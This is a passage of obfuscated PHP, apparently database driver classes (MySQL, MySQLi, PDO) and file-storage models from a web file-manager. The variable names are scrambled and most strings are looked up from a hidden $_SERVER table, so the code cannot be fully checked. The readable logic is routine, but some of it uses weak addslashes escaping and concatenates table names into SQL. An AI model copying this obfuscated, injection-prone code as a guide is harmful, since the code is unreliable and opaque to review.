mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Š© èı¢ =& $_SERVER[ Ö‘ñÄ”]; $this->error = mysql_errno() . $Š© èı¢[4] . mysql_error($this->_linkID); if ($Š© èı¢[12] != $this->queryStr) { $this->error .= LNG($Š© èı¢[48]) . $this->queryStr; } think_trace($this->error, $Š© èı¢[12], $Š© èı¢[49]); return $this->error; } public function escapeString($ë‘İéÄÇ) { if ($this->_linkID) { return mysql_real_escape_string($ë‘İéÄÇ, $this->_linkID); } else { return mysql_escape_string($ë‘İéÄÇ); } } public function parseKey(&$¯¥”•, $•²çˆšÚ = true) { $ÚËŸè =& $_SERVER[ Ö‘ñÄ”]; if ($•²çˆšÚ) { $¯¥”• = $this->parseKeyCheck($¯¥”•); } if ($¯¥”• != $ÚËŸè[188] && !preg_match($ÚËŸè[917], $¯¥”•)) { $¯¥”• = $ÚËŸè[393] . trim($¯¥”•, $ÚËŸè[393]) . $ÚËŸè[393]; } return $¯¥”•; } } class DbMysqli extends Db { public function __construct($óû—ŞÀù = '') { $Î¯¾Ëó =& $_SERVER[ Ö‘ñÄ”]; if (!extension_loaded($Î¯¾Ëó[918])) { think_exception(think_lang($Î¯¾Ëó[14]) . $Î¯¾Ëó[919]); } if (!empty($óû—ŞÀù)) { $this->config = $óû—ŞÀù; if (empty($this->config[$Î¯¾Ëó[17]])) { $this->config[$Î¯¾Ëó[17]] = $Î¯¾Ëó[12]; } } } public function connect($ß¦ê„Š = '', $ù¿Ÿìƒş = 0) { $–´½•¯ˆ =& $_SERVER[ Ö‘ñÄ”]; if (!isset($this->linkID[$ù¿Ÿìƒş])) { if (empty($ß¦ê„Š)) { $ß¦ê„Š = $this->config; } $this->linkID[$ù¿Ÿìƒş] = new mysqli($ß¦ê„Š[$–´½•¯ˆ[892]], $ß¦ê„Š[$–´½•¯ˆ[894]], $ß¦ê„Š[$–´½•¯ˆ[895]], $ß¦ê„Š[$–´½•¯ˆ[21]], $ß¦ê„Š[$–´½•¯ˆ[893]] ? intval($ß¦ê„Š[$–´½•¯ˆ[893]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ñ™ˆä¨ = $this->linkID[$ù¿Ÿìƒş]->server_version; $this->linkID[$ù¿Ÿìƒş]->query($–´½•¯ˆ[896] . think_config($–´½•¯ˆ[897]) . $–´½•¯ˆ[58]); if ($ñ™ˆä¨ > $–´½•¯ˆ[898]) { $this->linkID[$ù¿Ÿìƒş]->query($–´½•¯ˆ[899]); } $this->connected = !0; if (1 != think_config($–´½•¯ˆ[22])) { unset($this->config); } } return $this->linkID[$ù¿Ÿìƒş]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($×Åòì¢±) { $¡õÉà‚İ =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $×Åòì¢±; if ($this->queryID) { $this->free(); } think_action_status($¡õÉà‚İ[23], 1); think_status($¡õÉà‚İ[24]); $this->queryID = $this->_linkID->query($×Åòì¢±); if ($this->_linkID->more_results()) { while (($óÖƒşË = $this->_linkID->next_result()) != NULL) { $óÖƒşË->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ğ‚˜¡‚) { $Ò¶€­î =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ğ‚˜¡‚; if ($this->queryID) { $this->free(); } think_action_status($Ò¶€­î[25], 1); think_status($Ò¶€­î[24]); $ÉŒãÂ×è = $this->_linkID->query($ğ‚˜¡‚); $this->debug(); if (!1 === $ÉŒãÂ×è) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $íÑÇİ¸ì = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$íÑÇİ¸ì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÇÕ¥Å‡“ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÇÕ¥Å‡“) { $this->error(); return !1; } } return !0; } private function getAll() { $Œ®­Ã = array(); if ($this->numRows > 0) { for ($Ò™½êÏó = 0; $Ò™½êÏó < $this->numRows; $Ò™½êÏó++) { $Œ®­Ã[$Ò™½êÏó] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Œ®­Ã; } public function getFields($ªùöŞï) { $Ä½ùƒ¬ =& $_SERVER[ Ö‘ñÄ”]; $–ğä¸Ô· = $this->query($Ä½ùƒ¬[903] . $this->parseKey($ªùöŞï)); $Òş¦Áì® = array(); if ($–ğä¸Ô·) { foreach ($–ğä¸Ô· as $õ¸Æ³ëé => $ÜüæÛˆ) { $Òş¦Áì®[$ÜüæÛˆ[$Ä½ùƒ¬[31]]] = array($Ä½ùƒ¬[32] => $ÜüæÛˆ[$Ä½ùƒ¬[31]], $Ä½ùƒ¬[33] => $ÜüæÛˆ[$Ä½ùƒ¬[34]], $Ä½ùƒ¬[35] => (bool) ($ÜüæÛˆ[$Ä½ùƒ¬[36]] === $Ä½ùƒ¬[12]), $Ä½ùƒ¬[37] => $ÜüæÛˆ[$Ä½ùƒ¬[38]], $Ä½ùƒ¬[39] => strtolower($ÜüæÛˆ[$Ä½ùƒ¬[40]]) == $Ä½ùƒ¬[41], $Ä½ùƒ¬[42] => strtolower($ÜüæÛˆ[$Ä½ùƒ¬[43]]) == $Ä½ùƒ¬[44]); } } return $Òş¦Áì®; } public function getTables($ÕØÏ’é° = '') { $­÷Ö°Î¦ =& $_SERVER[ Ö‘ñÄ”]; $ÊÔÛÈåœ = !empty($ÕØÏ’é°) ? $­÷Ö°Î¦[905] . $ÕØÏ’é° . $­÷Ö°Î¦[906] : $­÷Ö°Î¦[907]; $—±‹å„ü = $this->query($ÊÔÛÈåœ); $±³“Ÿ¿ = array(); if ($—±‹å„ü) { foreach ($—±‹å„ü as $Í«ÛÄ => $ëá¢ûœ) { $±³“Ÿ¿[$Í«ÛÄ] = current($ëá¢ûœ); } } return $±³“Ÿ¿; } public function replace($°óçş†¨, $…’Ïº¨ = array()) { $ Ÿ“ŸÄ© =& $_SERVER[ Ö‘ñÄ”]; foreach ($°óçş†¨ as $¶éÏ´¡ => $¶ÊÛØûŒ) { $ŞÑÎŸ½ = $this->parseValue($¶ÊÛØûŒ); if (is_scalar($ŞÑÎŸ½)) { $éò¨Ÿ·[] = $ŞÑÎŸ½; $ãÏá¹³›[] = $this->parseKey($¶éÏ´¡); } } $éšãèš = $ Ÿ“ŸÄ©[908] . $this->parseTable($…’Ïº¨[$ Ÿ“ŸÄ©[288]]) . $ Ÿ“ŸÄ©[909] . implode($ Ÿ“ŸÄ©[50], $ãÏá¹³›) . $ Ÿ“ŸÄ©[910] . implode($ Ÿ“ŸÄ©[50], $éò¨Ÿ·) . $ Ÿ“ŸÄ©[911]; return $this->execute($éšãèš); } public function insertAll($Ç®ÀíÉ–, $£ ã¸ĞÍ = array(), $° ñ“ˆÏ = false) { $ÁÒšÅÜø =& $_SERVER[ Ö‘ñÄ”]; if (!is_array($Ç®ÀíÉ–[0])) { return !1; } $†Ù³òÏÎ = array_keys($Ç®ÀíÉ–[0]); $ï¢Ò°ÙÏ = array(); foreach ($Ç®ÀíÉ– as $¬Â‰Ê’Ö) { $¨×åßÏê = array(); foreach ($¬Â‰Ê’Ö as $ÛÌúí¨Ş => $û€ı­ÕÒ) { $û€ı­ÕÒ = $this->parseValue($û€ı­ÕÒ); if (is_scalar($û€ı­ÕÒ)) { $¨×åßÏê[] = $û€ı­ÕÒ; } } $ï¢Ò°ÙÏ[] = $ÁÒšÅÜø[269] . implode($ÁÒšÅÜø[50], $¨×åßÏê) . $ÁÒšÅÜø[911]; } array_walk($†Ù³òÏÎ, array($this, $ÁÒšÅÜø[912])); $ç¦ÖÊ¬ï = $° ñ“ˆÏ ? $ÁÒšÅÜø[913] : $ÁÒšÅÜø[914]; $ú£ÃŠ½ = $ç¦ÖÊ¬ï . $ÁÒšÅÜø[915] . $this->parseTable($£ ã¸ĞÍ[$ÁÒšÅÜø[288]]) . $ÁÒšÅÜø[909] . implode($ÁÒšÅÜø[50], $†Ù³òÏÎ) . $ÁÒšÅÜø[916] . implode($ÁÒšÅÜø[50], $ï¢Ò°ÙÏ); return $this->execute($ú£ÃŠ½); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $—Â£–©è =& $_SERVER[ Ö‘ñÄ”]; $this->error = $this->_linkID->errno . $—Â£–©è[4] . $this->_linkID->error; if ($—Â£–©è[12] != $this->queryStr) { $this->error .= LNG($—Â£–©è[48]) . $this->queryStr; } think_trace($this->error, $—Â£–©è[12], $—Â£–©è[49]); return $this->error; } public function escapeString($”¸¿Ñ€) { if ($this->_linkID) { return $this->_linkID->real_escape_string($”¸¿Ñ€); } else { return addslashes($”¸¿Ñ€); } } public function parseKey(&$¸¬òë ÷, $º„™Ü‡ = true) { $±Úç‘ã¹ =& $_SERVER[ Ö‘ñÄ”]; if ($º„™Ü‡) { $¸¬òë ÷ = $this->parseKeyCheck($¸¬òë ÷); } if ($¸¬òë ÷ != $±Úç‘ã¹[188] && !preg_match($±Úç‘ã¹[917], $¸¬òë ÷)) { $¸¬òë ÷ = $±Úç‘ã¹[393] . trim($¸¬òë ÷, $±Úç‘ã¹[393]) . $±Úç‘ã¹[393]; } return $¸¬òë ÷; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($µòŸ¶µ = '') { $¦™ÀÛÙ =& $_SERVER[ Ö‘ñÄ”]; if (!class_exists($¦™ÀÛÙ[920])) { think_exception(think_lang($¦™ÀÛÙ[14]) . $¦™ÀÛÙ[921]); } if (!empty($µòŸ¶µ)) { $this->config = $µòŸ¶µ; if (empty($this->config[$¦™ÀÛÙ[17]])) { $this->config[$¦™ÀÛÙ[17]] = array(); } } } public function connect($ú¯ÜñØ‡ = '', $áóÏ‘Ø = 0) { $ñ¨ÍÕ¬ =& $_SERVER[ Ö‘ñÄ”]; if (!isset($this->linkID[$áóÏ‘Ø])) { if (empty($ú¯ÜñØ‡)) { $ú¯ÜñØ‡ = $this->config; } $ˆ¾Ì¢Ş = !empty($ú¯ÜñØ‡[$ñ¨ÍÕ¬[17]][$ñ¨ÍÕ¬[18]]) ? $ú¯ÜñØ‡[$ñ¨ÍÕ¬[17]][$ñ¨ÍÕ¬[18]] : $this->pconnect; if ($ˆ¾Ì¢Ş) { $ú¯ÜñØ‡[$ñ¨ÍÕ¬[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$áóÏ‘Ø] = new PDO($ú¯ÜñØ‡[$ñ¨ÍÕ¬[922]], $ú¯ÜñØ‡[$ñ¨ÍÕ¬[894]], $ú¯ÜñØ‡[$ñ¨ÍÕ¬[895]], $ú¯ÜñØ‡[$ñ¨ÍÕ¬[17]]); } catch (PDOException $©Êƒä™´) { think_exception($©Êƒä™´->getMessage()); } $this->dbType = $this->_getDsnType($ú¯ÜñØ‡[$ñ¨ÍÕ¬[922]]); if (in_array($this->dbType, array($ñ¨ÍÕ¬[923], $ñ¨ÍÕ¬[924], $ñ¨ÍÕ¬[925], $ñ¨ÍÕ¬[926]))) { think_exception($ñ¨ÍÕ¬[927] . $this->dbType . $ñ¨ÍÕ¬[928] . $this->dbType . $ñ¨ÍÕ¬[929]); } if (!$this->linkID[$áóÏ‘Ø]) { think_exception($ñ¨ÍÕ¬[930]); } try { $this->linkID[$áóÏ‘Ø]->exec($ñ¨ÍÕ¬[931] . think_config($ñ¨ÍÕ¬[897])); } catch (Exception $©Êƒä™´) { } $this->connected = !0; if (1 != think_config($ñ¨ÍÕ¬[22])) { unset($this->config); } } return $this->linkID[$áóÏ‘Ø]; } public function free() { $this->PDOStatement = null; } public function query($×ä©›é, $Ì´»ËğÔ = array()) { $üéÂõ“² =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $×ä©›é; if (!empty($Ì´»ËğÔ)) { $this->queryStr .= $üéÂõ“²[932] . print_r($Ì´»ËğÔ, !0) . $üéÂõ“²[933]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($üéÂõ“²[23], 1); think_status($üéÂõ“²[24]); $this->PDOStatement = $this->_linkID->prepare($×ä©›é); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Î§ŒÄ À = $this->PDOStatement->execute($Ì´»ËğÔ); $this->debug(); if (!1 === $Î§ŒÄ À) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($†”ã¤µ¤, $äêãèÅ = array()) { $ÍÙãŒ¼ =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $†”ã¤µ¤; if (!empty($äêãèÅ)) { $this->queryStr .= $ÍÙãŒ¼[932] . print_r($äêãèÅ, !0) . $ÍÙãŒ¼[933]; } $ºÑ¼ğ£ = !1; if ($this->dbType == $ÍÙãŒ¼[926]) { if (preg_match($ÍÙãŒ¼[934], $this->queryStr, $ó³©©çœ)) { $this->table = think_config($ÍÙãŒ¼[935]) . str_ireplace(think_config($ÍÙãŒ¼[936]), $ÍÙãŒ¼[246], $ó³©©çœ[2]); $ºÑ¼ğ£ = (bool) $this->query($ÍÙãŒ¼[937] . strtoupper($this->table) . $ÍÙãŒ¼[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÍÙãŒ¼[25], 1); think_status($ÍÙãŒ¼[24]); $this->PDOStatement = $this->_linkID->prepare($†”ã¤µ¤); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $§ó§ŒÙ« = $this->PDOStatement->execute($äêãèÅ); $this->debug(); if (!1 === $§ó§ŒÙ«) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ºÑ¼ğ£ || preg_match($ÍÙãŒ¼[938], $†”ã¤µ¤)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ë»ÈüÚø = $this->_linkID->commit(); $this->transTimes = 0; if (!$ë»ÈüÚø) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $åÉ»¶©£ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$åÉ»¶©£) { $this->error(); return !1; } } return !0; } private function getAll() { $¼Í‚Şü‚ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¼Í‚Şü‚); return $¼Í‚Şü‚; } public function getFields($½õ¯¥ìı) { $ªŞ·äáÈ =& $_SERVER[ Ö‘ñÄ”]; $this->initConnect(!0); if (think_config($ªŞ·äáÈ[939])) { $›— Ëƒ¬ = str_replace($ªŞ·äáÈ[940], $½õ¯¥ìı, think_config($ªŞ·äáÈ[939])); } else { switch ($this->dbType) { case $ªŞ·äáÈ[923]: case $ªŞ·äáÈ[941]: $›— Ëƒ¬ = "\x53\x45\114\105\x43\124\40\40\40\x63\x6f\154\x75\x6d\156\x5f\x6e\141\x6d\145\40\x61\x73\x20\x27\x4e\141\x6d\x65\x27\x2c\x20\x20\x20\144\x61\x74\x61\137\x74\171\x70\x65\40\141\x73\x20\x27\x54\x79\x70\145\x27\54\x20\x20\x20\x63\x6f\x6c\x75\x6d\x6e\x5f\x64\x65\x66\141\165\154\x74\x20\141\x73\x20\x27\104\x65\x66\141\x75\x6c\x74\x27\x2c\40\x20\x20\151\x73\137\156\x75\x6c\x6c\141\142\x6c\145\x20\141\163\40\x27\116\165\154\154\x27\12\11\11\x46\122\x4f\115\11\151\156\x66\157\x72\155\141\x74\x69\157\156\x5f\x73\143\x68\x65\155\x61\56\164\141\x62\x6c\145\163\x20\101\x53\40\x74\xa\11\11\112\117\x49\116\x9\x69\156\146\157\x72\x6d\x61\x74\151\157\156\137\163\143\x68\145\x6d\141\56\143\x6f\154\x75\x6d\x6e\163\x20\101\x53\40\x63\12\x9\11\x4f\116\40\40\x74\x2e\x74\141\x62\x6c\x65\x5f\143\x61\164\x61\154\x6f\x67\40\x3d\x20\x63\x2e\x74\x61\x62\154\145\137\143\x61\164\141\154\x6f\147\xa\x9\11\x41\116\x44\40\164\x2e\164\x61\142\x6c\x65\137\x73\x63\150\145\x6d\141\x20\75\40\143\x2e\164\x61\142\x6c\145\137\x73\x63\150\145\x6d\141\xa\x9\x9\101\116\x44\40\164\x2e\x74\x61\x62\154\x65\x5f\x6e\x61\x6d\x65\40\75\x20\x63\56\164\141\142\x6c\x65\x5f\156\141\155\x65\xa\11\11\x57\x48\x45\122\105\40\40\40\164\x2e\x74\141\x62\154\145\x5f\x6e\141\x6d\145\40\x3d\40\x27{$½õ¯¥ìı}\x27"; break; case $ªŞ·äáÈ[942]: $›— Ëƒ¬ = $ªŞ·äáÈ[943] . $½õ¯¥ìı . $ªŞ·äáÈ[944]; break; case $ªŞ·äáÈ[924]: case $ªŞ·äáÈ[926]: $›— Ëƒ¬ = $ªŞ·äáÈ[945] . $ªŞ·äáÈ[946] . $ªŞ·äáÈ[947] . strtoupper($½õ¯¥ìı) . $ªŞ·äáÈ[948] . strtoupper($½õ¯¥ìı) . $ªŞ·äáÈ[949]; break; case $ªŞ·äáÈ[950]: $›— Ëƒ¬ = $ªŞ·äáÈ[951] . $½õ¯¥ìı . $ªŞ·äáÈ[952]; break; case $ªŞ·äáÈ[925]: break; case $ªŞ·äáÈ[953]: default: $›— Ëƒ¬ = $ªŞ·äáÈ[954] . ($this->dbType == $ªŞ·äáÈ[953] ? "\140{$½õ¯¥ìı}\x60" : $½õ¯¥ìı); } } $ÄÍöÛ¼  = $this->query($›— Ëƒ¬); $ë‹™ã¿™ = array(); if ($ÄÍöÛ¼ ) { foreach ($ÄÍöÛ¼  as $†ñáïóµ => $š˜Üöâœ) { $š˜Üöâœ = array_change_key_case($š˜Üöâœ); $š˜Üöâœ[$ªŞ·äáÈ[32]] = isset($š˜Üöâœ[$ªŞ·äáÈ[32]]) ? $š˜Üöâœ[$ªŞ·äáÈ[32]] : $ªŞ·äáÈ[246]; $š˜Üöâœ[$ªŞ·äáÈ[33]] = isset($š˜Üöâœ[$ªŞ·äáÈ[33]]) ? $š˜Üöâœ[$ªŞ·äáÈ[33]] : $ªŞ·äáÈ[246]; $¹›»Œ…¶ = isset($š˜Üöâœ[$ªŞ·äáÈ[282]]) ? $š˜Üöâœ[$ªŞ·äáÈ[282]] : $š˜Üöâœ[$ªŞ·äáÈ[32]]; $ë‹™ã¿™[$¹›»Œ…¶] = array($ªŞ·äáÈ[32] => $¹›»Œ…¶, $ªŞ·äáÈ[33] => $š˜Üöâœ[$ªŞ·äáÈ[33]], $ªŞ·äáÈ[35] => (bool) (isset($š˜Üöâœ[$ªŞ·äáÈ[103]]) && $š˜Üöâœ[$ªŞ·äáÈ[103]] === $ªŞ·äáÈ[12] || isset($š˜Üöâœ[$ªŞ·äáÈ[35]]) && $š˜Üöâœ[$ªŞ·äáÈ[35]] === $ªŞ·äáÈ[12]), $ªŞ·äáÈ[37] => isset($š˜Üöâœ[$ªŞ·äáÈ[37]]) ? $š˜Üöâœ[$ªŞ·äáÈ[37]] : (isset($š˜Üöâœ[$ªŞ·äáÈ[56]]) ? $š˜Üöâœ[$ªŞ·äáÈ[56]] : $ªŞ·äáÈ[246]), $ªŞ·äáÈ[39] => isset($š˜Üöâœ[$ªŞ·äáÈ[94]]) ? strtolower($š˜Üöâœ[$ªŞ·äáÈ[94]]) == $ªŞ·äáÈ[41] : (isset($š˜Üöâœ[$ªŞ·äáÈ[57]]) ? $š˜Üöâœ[$ªŞ·äáÈ[57]] : !1), $ªŞ·äáÈ[42] => isset($š˜Üöâœ[$ªŞ·äáÈ[955]]) ? strtolower($š˜Üöâœ[$ªŞ·äáÈ[955]]) == $ªŞ·äáÈ[44] : (isset($š˜Üöâœ[$ªŞ·äáÈ[94]]) ? $š˜Üöâœ[$ªŞ·äáÈ[94]] : !1)); } } return $ë‹™ã¿™; } public function getTables($Öæ·Ö®¿ = '') { $ÈÅÌÒÚ =& $_SERVER[ Ö‘ñÄ”]; if (think_config($ÈÅÌÒÚ[956])) { $à‰Ö˜® = str_replace($ÈÅÌÒÚ[957], $Öæ·Ö®¿, think_config($ÈÅÌÒÚ[956])); } else { switch ($this->dbType) { case $ÈÅÌÒÚ[924]: case $ÈÅÌÒÚ[926]: $à‰Ö˜® = $ÈÅÌÒÚ[958]; break; case $ÈÅÌÒÚ[923]: case $ÈÅÌÒÚ[941]: $à‰Ö˜® = $ÈÅÌÒÚ[959]; break; case $ÈÅÌÒÚ[950]: $à‰Ö˜® = $ÈÅÌÒÚ[960]; break; case $ÈÅÌÒÚ[925]: think_exception(think_lang($ÈÅÌÒÚ[961]) . $ÈÅÌÒÚ[962]); break; case $ÈÅÌÒÚ[942]: $à‰Ö˜® = $ÈÅÌÒÚ[45] . $ÈÅÌÒÚ[46] . $ÈÅÌÒÚ[47]; break; case $ÈÅÌÒÚ[953]: default: if (!empty($Öæ·Ö®¿)) { $à‰Ö˜® = $ÈÅÌÒÚ[905] . $Öæ·Ö®¿ . $ÈÅÌÒÚ[906]; } else { $à‰Ö˜® = $ÈÅÌÒÚ[907]; } } } $´½ˆê©˜ = $this->query($à‰Ö˜®); $±ÚÆë = array(); foreach ($´½ˆê©˜ as $ØÆñ·ë => $³îµ¢) { $±ÚÆë[$ØÆñ·ë] = current($³îµ¢); } return $±ÚÆë; } protected function parseLimit($×à„òî) { $Ã•™¢ë =& $_SERVER[ Ö‘ñÄ”]; $İìğòª’ = $Ã•™¢ë[12]; if (!empty($×à„òî)) { switch ($this->dbType) { case $Ã•™¢ë[950]: case $Ã•™¢ë[942]: $×à„òî = explode($Ã•™¢ë[50], $×à„òî); if (count($×à„òî) > 1) { $İìğòª’ .= $Ã•™¢ë[51] . $×à„òî[1] . $Ã•™¢ë[52] . $×à„òî[0] . $Ã•™¢ë[53]; } else { $İìğòª’ .= $Ã•™¢ë[51] . $×à„òî[0] . $Ã•™¢ë[53]; } break; case $Ã•™¢ë[923]: case $Ã•™¢ë[941]: break; case $Ã•™¢ë[925]: break; case $Ã•™¢ë[924]: case $Ã•™¢ë[926]: break; case $Ã•™¢ë[953]: default: $İìğòª’ .= $Ã•™¢ë[51] . $×à„òî . $Ã•™¢ë[53]; } } return $İìğòª’; } public function parseKey(&$¬Ç´ÊŠá, $–Ïäëƒö = true) { $ø™¿Ìã =& $_SERVER[ Ö‘ñÄ”]; if ($–Ïäëƒö) { $¬Ç´ÊŠá = $this->parseKeyCheck($¬Ç´ÊŠá); } if ($this->dbType == $ø™¿Ìã[953]) { if ($¬Ç´ÊŠá != $ø™¿Ìã[188] && !preg_match($ø™¿Ìã[917], $¬Ç´ÊŠá)) { $¬Ç´ÊŠá = $ø™¿Ìã[393] . trim($¬Ç´ÊŠá, $ø™¿Ìã[393]) . $ø™¿Ìã[393]; } return $¬Ç´ÊŠá; } else { return parent::parseKey($¬Ç´ÊŠá, $–Ïäëƒö); } } public function close() { $this->_linkID = null; } public function error() { $ÊĞş˜œ =& $_SERVER[ Ö‘ñÄ”]; if ($this->PDOStatement) { $ê§ñ­¢¿ = $this->PDOStatement->errorInfo(); $this->error = $ê§ñ­¢¿[1] . $ÊĞş˜œ[4] . $ê§ñ­¢¿[2]; } else { $this->error = $ÊĞş˜œ[12]; } if ($ÊĞş˜œ[12] != $this->queryStr) { $this->error .= LNG($ÊĞş˜œ[48]) . $this->queryStr; } think_trace($this->error, $ÊĞş˜œ[12], $ÊĞş˜œ[49]); return $this->error; } public function escapeString($È÷–›ï„) { $É‡²ò“š =& $_SERVER[ Ö‘ñÄ”]; switch ($this->dbType) { case $É‡²ò“š[950]: case $É‡²ò“š[923]: case $É‡²ò“š[941]: case $É‡²ò“š[953]: return addslashes($È÷–›ï„); case $É‡²ò“š[925]: case $É‡²ò“š[942]: case $É‡²ò“š[924]: case $É‡²ò“š[926]: return str_ireplace($É‡²ò“š[58], $É‡²ò“š[59], $È÷–›ï„); } } protected function parseValue($¹Ï€ÏÛ) { $‘‰Ò‡ =& $_SERVER[ Ö‘ñÄ”]; if (is_string($¹Ï€ÏÛ)) { $Âö£Õ¸ = strpos($¹Ï€ÏÛ, $‘‰Ò‡[4]) === 0 && in_array($¹Ï€ÏÛ, array_keys($this->bind)); $¹Ï€ÏÛ = $Âö£Õ¸ ? $this->escapeString($¹Ï€ÏÛ) : $‘‰Ò‡[963] . $this->escapeString($¹Ï€ÏÛ) . $‘‰Ò‡[963]; } elseif (isset($¹Ï€ÏÛ[0]) && is_string($¹Ï€ÏÛ[0]) && strtolower($¹Ï€ÏÛ[0]) == $‘‰Ò‡[306]) { $¹Ï€ÏÛ = $this->escapeString($¹Ï€ÏÛ[1]); } elseif (is_array($¹Ï€ÏÛ)) { $¹Ï€ÏÛ = array_map(array($this, $‘‰Ò‡[964]), $¹Ï€ÏÛ); } elseif (is_bool($¹Ï€ÏÛ)) { $¹Ï€ÏÛ = $¹Ï€ÏÛ ? $‘‰Ò‡[88] : $‘‰Ò‡[197]; } elseif (is_null($¹Ï€ÏÛ)) { $¹Ï€ÏÛ = $‘‰Ò‡[103]; } return $¹Ï€ÏÛ; } public function getLastInsertId() { $ĞÙ†® =& $_SERVER[ Ö‘ñÄ”]; switch ($this->dbType) { case $ĞÙ†®[950]: case $ĞÙ†®[942]: case $ĞÙ†®[923]: case $ĞÙ†®[941]: case $ĞÙ†®[925]: case $ĞÙ†®[953]: return $this->_linkID->lastInsertId(); case $ĞÙ†®[924]: case $ĞÙ†®[926]: $’ó¿ŒË¥ = $this->table; $Úçî‹·  = $this->query("\123\105\114\x45\x43\x54\x20{$’ó¿ŒË¥}\x2e\143\x75\x72\x72\x76\x61\154\x20\143\165\162\162\166\x61\x6c\x20\106\122\117\115\40\x64\165\x61\x6c"); return $Úçî‹·  ? $Úçî‹· [0][$ĞÙ†®[965]] : 0; } } } goto c“º°³ÖÂš; e‰ùÌ…Æ­á: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\x6c\145\137\x63\157\x6e\x74\145\156\164\163"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\151\155\x65", "\x74\x69\155\145", "\151\156\163\145\162\164", "\x66\165\x6e\x63\x74\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\154\145"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\x6d\145" => "\151\157\x5f\x66\x69\x6c\x65\x5f\x6d\x65\x74\141", "\155\x65\164\x61\106\x69\145\x6c\144" => "\x66\151\154\145\x49\104"); public function fileInfo($œ¬§øˆš) { $ˆ¾‘½Ò =& $_SERVER[ Ö‘ñÄ”]; static $˜ëËÇÀï = array(); if (!isset($˜ëËÇÀï[$œ¬§øˆš])) { $‡œé…ÅË = $ˆ¾‘½Ò[1885]; $À¨„ŠŠî = Model($ˆ¾‘½Ò[479])->field($‡œé…ÅË)->where(array($ˆ¾‘½Ò[477] => $œ¬§øˆš))->find(); $˜ëËÇÀï[$œ¬§øˆš] = $À¨„ŠŠî; } return $˜ëËÇÀï[$œ¬§øˆš]; } public function addFileByContent($ı°Ã“•Î = '', $·ÉæüßË = '') { $éæ¢­¨¹ =& $_SERVER[ Ö‘ñÄ”]; $›­İ‹ğ = TEMP_PATH . $éæ¢­¨¹[1886]; if (!is_dir($›­İ‹ğ)) { mk_dir($›­İ‹ğ); } $€ŒûÃ¾ = $›­İ‹ğ . $éæ¢­¨¹[1887] . rand_string(16); file_put_contents($€ŒûÃ¾, $ı°Ã“•Î); $ëê®´¿ß = $this->addFile($€ŒûÃ¾, $·ÉæüßË, !0); if (file_exists($€ŒûÃ¾)) { @unlink($€ŒûÃ¾); } return $ëê®´¿ß; } public function createFileName($Öì²È‘, $ÃÜâñš = false, $Ä‡Ô‰óÎ = false) { $©‰ı×Õ¶ =& $_SERVER[ Ö‘ñÄ”]; $†ÌÇ”à = IO::init($©‰ı×Õ¶[8]); $Ç‰“Ô¨Š = $this->makeFilePath($Öì²È‘, $†ÌÇ”à, $ÃÜâñš, $Ä‡Ô‰óÎ); $ññ ñŞã = $†ÌÇ”à->pathFather($Ç‰“Ô¨Š); static $¿°‘é‹Õ = false; $äÀã³ë½ = $©‰ı×Õ¶[1888] . md5($ññ ñŞã); if (!$¿°‘é‹Õ && !Cache::get($äÀã³ë½)) { $¿°‘é‹Õ = !0; $¥‡Ûéöá = IO::mkdir($ññ ñŞã); if (!IO::exist($¥‡Ûéöá . $©‰ı×Õ¶[810])) { IO::mkfile($¥‡Ûéöá . $©‰ı×Õ¶[810]); } Cache::set($äÀã³ë½, 1, 3600 * 2); } return $Ç‰“Ô¨Š; } public function makeFilePath($¼¨Õ²ù´, $Œ²ŸèŒ, $óÎœ‹íÊ = false, $æÂ­ù½× = false) { $ı´­æ±Ü =& $_SERVER[ Ö‘ñÄ”]; $¥Ş€õ»¹ = Model($ı´­æ±Ü[783])->get($ı´­æ±Ü[1889]); $şè…Êı = KodIO::defaultIO() . date($ı´­æ±Ü[1890]); $±É°ÊÑ = $şè…Êı . rand_string(5) . short_id(100); $¼¨Õ²ù´ = str_replace($ı´­æ±Ü[8], $ı´­æ±Ü[11], 